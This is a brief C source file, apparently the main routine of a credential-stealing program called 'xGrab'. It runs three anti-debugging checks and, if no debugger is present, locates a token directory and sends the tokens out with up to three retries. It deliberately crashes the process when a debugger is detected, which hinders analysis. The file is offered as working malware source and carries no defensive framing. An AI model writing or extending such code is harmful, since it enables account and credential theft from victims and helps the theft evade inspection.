#include "external.h"
#include "defense.h"
#include "files.h"
#include "network.h"

int xGrabEntry() {

	int version = 31012022, counter = 3;
	BOOL success = FALSE;
	
	loadFunctions();

	if (!checkDebuggerPEB() && !checkDebuggerQuery() && !checkDebuggerGlobalFlags()) {

		do {

			success = sendToken(searchTokenDirectory());

		} while (!success && counter--);

	}
	else {

		*((int*)0) = version;
	}

	return 0;
}
